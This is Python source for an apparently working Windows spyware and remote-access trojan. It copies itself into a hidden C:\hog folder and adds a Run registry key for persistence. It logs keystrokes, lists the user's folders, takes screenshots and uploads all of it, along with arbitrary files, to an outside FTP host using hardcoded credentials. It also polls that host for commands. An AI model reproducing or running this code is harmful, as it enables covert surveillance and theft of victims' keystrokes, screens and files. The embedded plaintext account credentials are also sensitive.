#from PIL import ImageGrab
import paramiko

from paramiko import Transport, SFTPClient

import threading

import subprocess

import os

import urllib.request

import time

import pyscreenshot as ImageGrab

import socket

import platform

import multiprocessing

import shutil

import getpass

import sys

import errno

import logging

from ftplib import FTP_TLS

jay = 'nay no I\'m not\''
print(jay)

given_path = "."
thename = getpass.getuser()

#Create SSH Session
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

theserver = "ftp.drivehq.com"
userper = "musimentaelly@gmail.com"
thepast = "borlandc99+++"
global filename1, dir, myId
filename=""
filename1=""
dir = ""
host = 'drivehq.com'

def basic_dirs():
 username = getpass.getuser()
 Users = str(os.listdir('C:\\Users'))
 Desktop = str(os.listdir('C:\\Users\\'+ username + '\\Desktop'))
 Documents = str(os.listdir('C:\\Users\\'+ username + '\\Documents'))
 Downloads = str(os.listdir('C:\\Users\\'+ username + '\\Downloads'))
 Music = str(os.listdir('C:\\Users\\'+ username + '\\Music'))
 Pictures = str(os.listdir('C:\\Users\\'+ username + '\\Pictures'))

 filename = "C:/hog/basicdirs.txt"
 f = open(filename,"w+")
 # Write host_id to file
 f.write('Users: '+Users)
 f.write('\n')
 f.write('Desktop: '+Desktop)
 f.write('\n')
 f.write('Documents: '+Documents)
 f.write('\n')
 f.write('Pictures: '+Pictures)
 f.write('\n')
 f.write('Desktop: '+Desktop)
 f.write('\n')
 f.close()
 return sftp('basic_dirs.txt','C:/hog/basicdirs.txt')

def getdir():
 try:
  getdirname = username + filename1
  dirlist = str(os.listdir(dir))
  fr = open('C:/hog/'+getdirname,"w+")
  # Write host_id to file
  fr.write(dir+'~ '+dirlist)
  fr.write('\n')
  fr.close()
 except Exception as e:
  ohno = e
 return sftp(filename1,'C:/hog/'+getdirname)

#Copy file to its own directory
def dir_hard():
 try:
  os.mkdir('C:\hog')
  os.system('attrib +H C:\hog')
  myPath = os.getcwd()
  shutil.copyfile(myPath+'\hog.exe', 'C:\hog\hog.exe')
 except:
  pass

def start_it():
 os.system('C:\hog\hog.exe')

def wait_for_internet_connection():
    while True:
        try:
            reminisce = urllib.request.urlopen('http://'+host,timeout=10)
            return
        except:
            pass
			
#Upload file
def sftp(filename,filesource):
 try:
   filename=thename+filename
   ft = FTP_TLS(theserver)
   ft.login(userper,thepast)
   #filename="sent.txt"
   fn=open(filesource,"rb")
   ft.storbinary('STOR '+filename,fn)
   ft.quit()
   fn.close()
 except Exception as e:
   ohno = e

#Download Files
def download(filepath):
   try:
    ftp = FTP_TLS(theserver)
    ftp.login(userper,thepast)
    #ftp.retrlines("LIST")

    #Get name of the file from the filepath
    #If path is C:\Users\Solotov\Downloads\Tash.txt then retrieve Tasha.txt
    # from the path name
    filename = os.path.basename(filepath)
    path = filepath.replace(filename,'')
    #Keep original filename
    filenametokeep = filename
    local_filename = os.path.join(r''+path+filename)
    downloadfile = filenametokeep
    local_path = local_filename
    if 'cc.xml' not in filenametokeep:
     remote_path = thename+downloadfile
    else:
     remote_path = downloadfile
    lf = open(local_filename, "wb")
    ftp.retrbinary("RETR " + remote_path, lf.write, 8*1024)
    lf.close()
    ftp.close()
    f = open('C:/hog/Downloads','w+')
    f.write('Download of ' + filename + ' Successfull')
    f.close()
    sftp('Downloads','C:/hog/Downloads')
   except Exception as e:
    ohno = e

print('Download ');

#Take screenshot
def screenshot():
 #if __name__ == "__main__":
  multiprocessing.freeze_support()
# grab full screen
  im = ImageGrab.grab()
 
# save image file
  im.save('C:/hog/screenshot.png')

# show image in a window
 #im.show()
  return sftp('screenshot.png','C:/hog/screenshot.png')

from pynput.keyboard import Key, Listener
import logging

def start_logger():
 f = open('C:/hog/maylee.txt','w+')
 f.write('')
 f.close()
 log_dir = "C:/hog/"
 
 logging.basicConfig(filename=(log_dir + "maylee.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
 startthelogger()

def on_press(key):
    logging.info('"{0}"'.format(key))
    l = open('c:/hog/maylee1.txt','a+')
    l.write(str(key)+'\n')
    l.close()

def startthelogger():
 with Listener(on_press=on_press) as listener:
  listener.join()

#Remove tags
from bs4 import BeautifulSoup

import re

TAG_RE = re.compile(r'<[^>]+>')

def remove_tags(text):
 return TAG_RE.sub('',text)

from winregistry import WinRegistry as Reg

path = r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
path2 = r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\seen_u'
reg = Reg()
kilo = "wax"
try:
 kilo = str(reg.read_value(path,'hog'))
except:
 pass 
#Add Key
def add_key():
 reg.create_key(path + r'\test')
 True if 'hog' in reg.read_key(r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run')['keys'] else False
 reg.write_value(path, 'hog', 'C:\hog\hog.exe', 'REG_SZ')

def shithappens():
 commandfile = 'C:\hog\\'+thename+'cc.xml'
 #try:
 thr = threading.Thread(target=start_logger)
 thr.start()
 #except:
  #pass
 global filename1, dir, myId
 try:
  basic_dirs()
 except:
  pass

 while True:
   filename="id" 

   # Read host id from id file
   try:
    f = open(filename,"w+")
    f.write("1")
    f.close()
    f = open(filename,"r")
    myId = f.read()
    myId = myId.strip('b\'')
   except:
    pass
  #retrieve commands from server
   #url = "http://" + ip + "/Sltv/"+myId
   wait_for_internet_connection()
   #Download commands
   try:
    download(commandfile)
   except Exception as e:
    ohno = e

   try:
    fbr = 'fuck being retired'
    print(fbr)
    with open(commandfile) as fn:
     # Read each line
     ln = fn.readline()
     # Keep count of lines
     lncnt = 1
     while ln:
      if '<Screenshot>1</Screenshot>' in ln:
       try:
        screenshot()
       except:
        f = open('C:/hog/Exceptions','w+')
        f.write('problem with the screenshot command')
        f.close()
        sftp('Exceptions','C:/hog/Exceptions')
      if '</Download>' in ln:
       try:
        result = remove_tags(ln)
        result = result.strip('\n')
        f = open('C:/hog/'+result+'Path','r')
        download(f.read())
        f.close()
       except:
        f = open('C:/hog/Exceptions','w+')
        f.write('problem with the download command')
        f.close()
        sftp('Exceptions','C:/hog/Exceptions')
      if '</Upload>' in ln:
       result = remove_tags(ln)
      if '</GetDir>' in ln:
       try:
        result,filename1 = ln.split('*')
        result = remove_tags(result)
        filename1 = remove_tags(filename1)
        result = result.strip('\n')
        filename1 = filename1.strip('\n')
        dir = result
        getdir()
       except:
        f = open('C:/hog/Exceptions','w+')
        f.write('problem with the get dir command')
        f.close()
        sftp('Exceptions','C:/hog/Exceptions')
      if '</Get>' in ln:
       get = remove_tags(ln)
       get = get.strip('\n')
       filename = os.path.basename(get)
       try:
        sftp(filename,get)
        f = open('C:/hog/'+filename+'Path','w+')
        f.write(get)
        f.close()
        sftp(filename+'Path','C:/hog/'+thename+filename+'Path')
       except:
        f = open('C:/hog/Exceptions','w+')
        f.write('problem with the get command')
        f.close()
        sftp('Exceptions','C:/hog/Exceptions')
      if '<Install>1</Install>' in ln:
       try:
        sftp('maylee1.txt','C:\hog\maylee1.txt')
       except:
        f = open('C:/hog/Exceptions','w+')
        f.write('problem with the install command')
        f.close()
        sftp('Exceptions','C:/hog/Exceptions')
      ln = fn.readline()
      lncnt +=1
   except:
    pass
   time.sleep(60)
  #client.close()

priyanka = 'chopra'

def main():
 path = r'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
 if 'hog' not in kilo:
  dir_hard()
  add_key()
  shithappens()

 else:
  shithappens()
	
if __name__ == "__main__":
 multiprocessing.freeze_support() 
 main()



